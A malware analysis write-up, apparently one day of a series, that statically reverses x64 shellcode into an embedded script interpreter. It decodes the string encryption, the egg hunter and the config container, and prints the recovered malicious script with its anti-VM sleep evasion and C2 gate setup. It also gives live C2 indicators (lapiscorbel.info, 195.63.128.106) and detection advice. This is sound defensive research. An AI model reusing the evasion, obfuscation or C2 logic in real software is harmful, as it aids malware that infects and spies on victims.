# Day 16 — The Script Inside

Day 15 ended with a loader that copies 1.58 MB of unencrypted x64 shellcode into memory and starts it. Eight seconds later the infected host connected to 195.63.128.106 on port 443. What I couldn't explain was how. The shellcode contains no readable API names, no networking imports and no IP address.

This writeup takes the shellcode apart. It turns out to be a script interpreter written in C++, carrying an embedded, obfuscated container with a configuration and a script. Decoding that container gives the C2 list, the anti-VM logic and the malware's local storage path, all without running the sample.

All work was static, inside FLARE-VM with no network access. Ghidra did the disassembly, and small Python scripts did the decoding.

## Carving the shellcode

From the loader analysis in Day 15, the payload starts at file offset 46056 in `runner_ilove.exe` and is `0x182156` bytes long. The first 16 bytes at that offset confirm it.

```
48 83 EC 28        sub  rsp, 28h          reserve stack space
33 C9              xor  ecx, ecx          first argument = 0
E8 91 DE 0C 00     call +0x0CDE91         call the main function
90                 nop
48 83 C4 28        add  rsp, 28h
(C3)               ret
```

This is a typical shellcode entry stub. It sets up the stack and calls the real main function. The call target is offset `0xB + 0x0CDE91 = 0xCDE9C` inside the shellcode.

```powershell
$b   = [IO.File]::ReadAllBytes("$PWD\runner_ilove.exe.bin")
$len = 0x182156
$sc  = New-Object byte[] $len
[Array]::Copy($b, 46056, $sc, 0, $len)
[IO.File]::WriteAllBytes("$PWD\shellcode.bin", $sc)
```

```
shellcode.bin   1581398 bytes
sha256 AF12D96922EC2431244415AC90FB9AED967E6B20C0229A1A38B762D5AB356D5C
```

Shellcode has no header, so Ghidra needs to be told what it is. I imported it as Raw Binary with language x86, 64-bit, little endian, Visual Studio conventions, then disassembled at offset 0 and at `0xCDE9C` before running auto analysis.

## The main function

The decompiled function at `0xCDE9C` is long, but the shape is clear. This isn't small hand-written shellcode. It's a full C++ program compiled to run position-independently, with objects that are constructed at the start and destroyed at the end. That explains the 1.5 MB.

Four things stand out.

**Encrypted strings.** Four times, the function fills an array of 16-bit values and passes it to a small decoding function. Each block is only reached when a check fails, so these look like error messages.

```c
local_4c8 = 0x8624e95ab737fc6d;     // seed
local_4c0 = 0xf8ad;                 // encrypted UTF-16 characters
local_4be = 0x6580;
...
FUN_0015b680(local_210, 0, 0x1b);   // memset
FUN_000cef44(&local_4c8, local_210); // decode into local_210
```

**One key everywhere.** The constant `0x16df3822a8` shows up in every step that deals with the embedded data.

**A self-search.** `FUN_000cebf0()` returns an address that is then checked and read with that key.

**Wait forever.** The function ends with a wait of `0xffffffff`, the same pattern as the loader. It's the reason the process, and its C2 connection, stays alive.

## Decrypting the strings

The decoder for the first string is short.

```c
local_10 = *param_1;                                   // 8-byte seed
for (i = 0; i < 0x1b; i++) {
    out[i] = enc[i] ^ ((short)local_10 * 2 + 0x11);
    local_10 = FUN_00001b10(local_10);
}
```

```c
longlong FUN_00001b10(longlong x) {
    return x * 0x19660d + 0x3c6ef35f;
}
```

`FUN_00001b10` is a linear congruential generator with the well-known constants 1664525 and 1013904223 from *Numerical Recipes*. Each character is XORed with a 16-bit key derived from the current state, and the state advances once per character. All four strings use the same seed, which is why they all start with the same encrypted values.

Running the same math over the values from the decompiler gives the four messages.

| Where | Decrypted text |
|---|---|
| the self-search finds nothing | `Failed! Not found settings` |
| first validation fails | `Failed! Invalid settings` |
| second validation fails | `Failed! Cannot open settings` |
| a required object is missing | `Failed! Not found settings.xml` |

So the data the shellcode looks for in itself is its settings, and somewhere inside is something called `settings.xml`. This kind of compile-time string encryption is the reason FLOSS found nothing in Day 15.

## The egg hunter

`FUN_000cebf0` starts at its own address in memory and walks forward byte by byte until a check function returns true.

```c
p = &DAT_000cebe0;
do {
    p = p + 1;
} while (!FUN_000978d8(p, 0x16df3822a8));
return p;
```

The check doesn't look for fixed bytes. It reads seven 8-byte values `q0` to `q6` at the current position and tests arithmetic relations between them and the key `K`.

```c
q1 == q0 * 7 + K * 3
q5 == q1 - (q0 + K) * 0x25
q6 == (q5 + 1) * (q0 + 1 + K)
```

A marker defined this way has no fixed byte pattern, so a simple signature can't find it. A short script that applies the same test to every offset of `shellcode.bin` finds exactly one match, at offset `0x15CEC2`.

The main function then reads the eight bytes before the marker and XORs them with the key. My first reading was that this gives the size of the settings, stored in front of the marker. Carving that region produced a file that started with `48 83 EC 28`, the shellcode's own entry stub. The decoded value is `0x15CEBA`, which is exactly the distance from the marker back to byte 0.

```c
len  = *(marker - 8) ^ 0x16df3822a8;   // 0x15ceba
base = (marker - 8) - len;             // byte 0 of the shellcode
```

The shellcode uses this to find its own base address in memory, which it can't know in advance. The settings are after the marker, not before it. From `0x15CEC2` to the end of the shellcode is `0x25294` bytes.

```
settings.bin   152212 bytes
sha256 08FEBE46FDCCEFCF5B5438ADCC6597FF5FFC45C9886842138613B7725546277D
entropy 6.96
```

## The container format

The function that validates the settings, `FUN_00097d40`, turns out to be a parser for a small container format. Its bounds checks give the layout away.

| Offset | Size | Content | Decoded by |
|---|---|---|---|
| `0x00` | `0x38` | main header, the same seven values as the marker | `FUN_00095108` |
| `0x38` | `0x18` | second header | `FUN_000951e0` |
| `0x50` | `0x28` | table info | `FUN_0009522c` |
| `0x78` | count × `0x58` | table of 88-byte records | |
| after the table | rest | data | |

Every header field is stored as an arithmetic expression rather than as a plain value. The three decoders each undo a different formula.

```c
// FUN_00095108, main header
version   = q2 - (K - q0*q1 + q5);      // 16-bit
field_2   = q3 - (K + q0*q1 + q5);      // 16-bit
field_3   = q4 - (K + q0*q1 + q5);      // 64-bit

// FUN_000951e0, second header
value     = r1 - K * r0;

// FUN_0009522c, table info
capacity  = p2 - K*p1 - p0;
count     = p3 - K*p0 + p1;
total     = p4 - K*(p0 + p1);
```

Applying them to the bytes in `settings.bin` gives this.

| Field | Value |
|---|---|
| version | 1 |
| second field | 0 |
| third field | `0x6ab436fd` |
| second header | 0 and 0 |
| table capacity | 1557 |
| table count | 1557 |
| total size | **152212** |

The total size is exactly the size of `settings.bin`. That can't be a coincidence, so the formulas are right.

The third header field, read as a Unix timestamp, is 23 September 2026 at 20.30 UTC. That is eight days before the infection. It could be the build time of this configuration. It could also be a checksum that happens to land on a plausible date, so I treat it as a guess.

The table takes `0x78 + 1557 × 0x58 = 137,136` bytes, leaving 15,076 bytes of data. 1557 records for 15 KB of data is far too many for a file list. It looks more like a hash table used to find resources by name. I didn't decode the records themselves, because the data turned out to be readable without them.

## The data is a script

The first bytes of the data area at `0x217B0` have a striking pattern.

```
000217B0   EA 8C F9 8C E2 8C EF 8C F8 8C E5 8C E3 8C E2 8C
000217C0   AC 8C FA 8C E3 8C E5 8C E8 8C AC 8C FF 8C E9 8C
```

Every second byte is `8C`. That is UTF-16 text where the zero high byte has been XORed with `0x8C`. XORing every byte with `0x8C` gives plain text.

```python
d = open(sys.argv[1], 'rb').read()
data = bytes(b ^ 0x8C for b in d[0x217B0:])
open(sys.argv[2], 'w', encoding='utf-8').write(data.decode('utf-16-le', errors='replace'))
```

The result is a script, in a language of its own.

```
function void setupWithGates()
{
    complex $gate_dictionary = runtime::resource_get_string_dictionary(@gate_list);
    int $gate_count = string_dictionary::count($gate_dictionary);
    int $gate_index = 0;

    loop
    {
        if ($gate_index >= $gate_count)
        {
            break;
        }

        string $host = string_dictionary::get_key($gate_dictionary, $gate_index);
        string $port_text = string_dictionary::get_value($gate_dictionary, $gate_index);
        int $port = runtime::cast_to_int($port_text);

        communicator::add_gate($host, $port);
        $gate_index = $gate_index + 1;
    }

    string_dictionary::destroy($gate_dictionary);
}

function void setupGateConnectionDetails()
{
    int $connect_period_sec = runtime::resource_get_int(@gate_connect_period_seconds);
    int $connected_duration_sec = runtime::resource_get_int(@gate_connected_duration_seconds);
    int $failed_reconnect_delay_sec = runtime::resource_get_int(@gate_failed_reconnect_delay_seconds);
    int $keep_alive_duration_sec = runtime::resource_get_int(@gate_keep_alive_duration_seconds);

    communicator::set_gate_connection_details($connect_period_sec, $connected_duration_sec, $failed_reconnect_delay_sec, $keep_alive_duration_sec);
}

function bool isVm()
{
	string $specFolder = pather::systemdrive_with_slash();
	$specFolder += "Intel";
	bool $exists = io::dir_exists($specFolder);
	if ($exists == true)
	{
		return false;
	}

	int $ramMB = system::get_ram_mb();
	if ($ramMB < 6144)
	{
		return true;
	}

	int $cpuCount = system::get_cpu_count();
	if ($cpuCount < 2)
	{
		return true;
	}

	complex $vm = antihacker::vmdetector_create_instance();
	antihacker::vmdetector_scan_light($vm);
	bool $light_present = antihacker::vmdetector_result_is_guest_vm($vm);
	if ($light_present == true)
	{
		antihacker::vmdetector_dispose_instance($vm);
		return true;
	}

	antihacker::vmdetector_scan_aggressive($vm);
	bool $aggressive_present = antihacker::vmdetector_result_is_vm_aggressive_by_opengl_directx($vm);
	antihacker::vmdetector_dispose_instance($vm);
	if ($aggressive_present == true)
	{
		return true;
	}

	return false;
}

function void antihacker_vm()
{
	bool $check_vm = runtime::resource_get_bool(@is_vmcheck);
	if ($check_vm == false)
	{
		return;
	}

	bool $invm = isVm();
	if ($invm == false)
	{
		return;
	}

	int $sleep_sec = runtime::resource_get_int(@vmdetect_sleep_seconds);
	delayer::delay_in_seconds($sleep_sec);
}

task start_com[active=true,async=false]
{
	antihacker_vm();
    setupWithGates();
    setupGateConnectionDetails();
    communicator::set_marketing_data(runtime::resource_get_bool(@is_marketing_notify));
    communicator::set_firstlaunch_screenshot(runtime::resource_get_bool(@is_tosend_firstlaunch_screenshot));
    communicator::start();
    delayer::delay_infinite();
}
```

This changes how the whole sample should be read. The 1.5 MB of C++ is mostly an **interpreter** with built-in libraries such as `communicator::`, `antihacker::`, `io::` and `system::`. The behaviour lives in this script. That is why the compiled code shows no C2 address and no obvious networking. The interpreter only exposes `communicator::add_gate` and `communicator::start`, and the script decides what to pass in.

What the script does, in order.

**VM check.** If `is_vmcheck` is set, `isVm()` runs a series of tests. An existing `C:\Intel` folder means a real machine, a shortcut that many physical PCs with Intel drivers will pass. Less than 6 GB of RAM or fewer than two CPUs means a VM. After that comes a light scan and an aggressive scan based on OpenGL and DirectX.

**Sleep, don't quit.** If it decides it's in a VM, it doesn't stop. It sleeps for `vmdetect_sleep_seconds` and then carries on. That defeats sandboxes that only watch for a few minutes, while still infecting real targets that look like VMs.

**C2 setup.** It reads `gate_list`, a dictionary of host and port pairs, and registers every entry with `communicator::add_gate`. Then it sets four timing values, the connect interval, how long to stay connected, the delay after a failed attempt and the keep-alive.

**Options and start.** It sets whether to send "marketing data" and whether to send a screenshot on first launch, starts the communicator and waits forever.

## The resources

After the script, the data looks like noise again. Short runs, though, have a constant high byte, the same pattern as the script but with a different value. Each resource name and value is UTF-16 XORed with its own single-byte key. A short script that looks for runs where every high byte is equal, and XORs the low byte with it, recovers all of them.

```
0x24eca  key 0xad  campaign
0x24ee2  key 0x79  first
0x24ef4  key 0xf0  lsdb_save_path
0x24f18  key 0x8a  {localappdata}\\TLService\\tsl.uml
0x24f64  key 0x43  lsdb_save_delay_seconds
0x24faa  key 0x4d  is_marketing_notify
0x24fe1  key 0x98  is_tosend_firstlaunch_screenshot
0x25032  key 0x5f  enable_acs_onstart
0x25067  key 0x55  gate_connect_period_seconds
0x250b5  key 0xc2  gate_connected_duration_seconds
0x2510b  key 0x8b  gate_failed_reconnect_delay_seconds
0x25169  key 0x72  gate_keep_alive_duration_seconds
0x251c1  key 0x3a  gate_list
0x251db  key 0x7c  lapiscorbel.info
0x251fb  key 0xb2  443
0x25205  key 0x4d  195.63.128.106
0x25221  key 0x6c  443
0x25233  key 0x84  is_vmcheck
0x25258  key 0xeb  vmdetect_sleep_seconds
```

String values are readable this way. Numbers and booleans are stored in binary, so only their names show up.

| Resource | Value |
|---|---|
| `campaign` | `first` |
| `lsdb_save_path` | `{localappdata}\TLService\tsl.uml` |
| `gate_list` | `lapiscorbel.info:443` and `195.63.128.106:443` |
| `is_vmcheck`, `vmdetect_sleep_seconds` | binary |
| `gate_*` timing values | binary |
| `is_marketing_notify`, `is_tosend_firstlaunch_screenshot` | binary |
| `lsdb_save_delay_seconds` | binary |
| `enable_acs_onstart` | binary, not used by the script |

**The C2 address is in the configuration.** In Day 15 the link between `runner_ilove.exe` and 195.63.128.106 rested on timing, a connection eight seconds after the download. Now the address is in the configuration embedded in the file itself.

**There is a second C2 server.** `lapiscorbel.info` on port 443 is listed first. It wasn't in the exercise and wasn't in the traffic. It's a new indicator that comes purely from the code.

**Local storage.** `%LOCALAPPDATA%\TLService\tsl.uml` is where the malware keeps its local database. That is a useful file to hunt for on endpoints.

## Why only the IP?

`lapiscorbel.info` is the first gate in the list, yet the host only ever talked to the IP. I checked the pcap for any trace of the domain.

```bash
strings -a 2026*.pcap | grep -i lapis
tcpdump -nr 2026*.pcap port 53 2>/dev/null | grep -i lapis
```

Both return nothing, and Kibana shows zero results. The host never resolved the domain. In a DNS packet the name is stored as labels, but `strings` would still find the 11-character `lapiscorbel` label, so this isn't a parsing gap.

Why the malware skipped it is not visible from the script. The selection logic sits in the C++ `communicator`, which I haven't read. It could pick a gate at random, start from the end, or skip hostnames. The browser on this host did use DNS over HTTPS to 8.8.4.4, so a lookup through that path can't be ruled out completely, though it seems unlikely for the malware.

## The full chain

1. curl downloads `runner_ilove.exe` from 107.175.82[.]242 on port 9000.
2. The MinGW loader, disguised as a Canonical "Diagnostics Service", copies 1.58 MB of plain x64 shellcode into memory and starts it.
3. The shellcode is a C++ script interpreter. It finds its own base address and its settings container with an egg hunter keyed on `0x16df3822a8`.
4. The container holds an obfuscated script, XORed with `0x8C`, and a set of resources, each XORed with its own byte.
5. The script checks for a VM, loads two gates from `gate_list` and starts the communicator.
6. Eight seconds after the download, the host connects to 195.63.128.106 on port 443, the second gate. The first gate, lapiscorbel.info, is never resolved.

## What this means for detection

- **Static signatures on the shellcode are weak.** The marker has no fixed bytes, strings are encrypted per string, and the configuration is XORed with a different key per value. What is stable is the interpreter code itself, and constants such as `0x16df3822a8`, `0x19660d` together with `0x3c6ef35f`, and the marker formula.
- **The configuration is extractable offline.** The egg hunter, the container decoders and the XOR schemes are simple enough to turn into a config extractor. That gives C2 servers and the campaign name for new samples of the same family without running them.
- **On the endpoint,** look for `%LOCALAPPDATA%\TLService\tsl.uml`.
- **On the network,** both gates use port 443 without TLS, which matches the Zeek observation from Day 15.

## Open questions

- How the shellcode resolves its Windows APIs. A search for `GS:` access to the PEB found nothing in the analysed code, so the resolver is either in code Ghidra didn't disassemble, or works differently.
- The values of the binary resources, such as the VM sleep time and the connection timing.
- What `enable_acs_onstart` does, since the script never uses it.
- What the purpose of the random-sized memory region in `FUN_000cd8d0` is.
- Why the communicator chose the IP over the domain.
- What the 12.76 MB received over the C2 connection contained.
- Which family this is. The exercise labels the C2 traffic as an RMS RAT. A configuration with `settings.xml`, gates and a scripting engine doesn't confirm or rule that out.

## Indicators

```
lapiscorbel[.]info:443          C2 gate 1, from configuration, not seen in traffic
195.63.128[.]106:443            C2 gate 2, from configuration, seen in traffic
%LOCALAPPDATA%\TLService\tsl.uml
campaign                        first

key                             0x16df3822a8
string decryption LCG           x * 0x19660d + 0x3c6ef35f
script XOR                      0x8C over UTF-16LE

runner_ilove.exe  sha256  b789adce70c028a6d17be45ec34667aa95586350ee0c4057e75b138b1ad35061
shellcode.bin     sha256  af12d96922ec2431244415ac90fb9aed967e6b20c0229a1a38b762d5ab356d5c
settings.bin      sha256  08febe46fdccefcf5b5438adcc6597ff5ffc45c9886842138613b7725546277d
```

## Source

■ [malware-traffic-analysis.net, 2026-10-01 traffic analysis exercise](https://www.malware-traffic-analysis.net/)<br>
■ Day 15 of this repository, for the network analysis and the loader
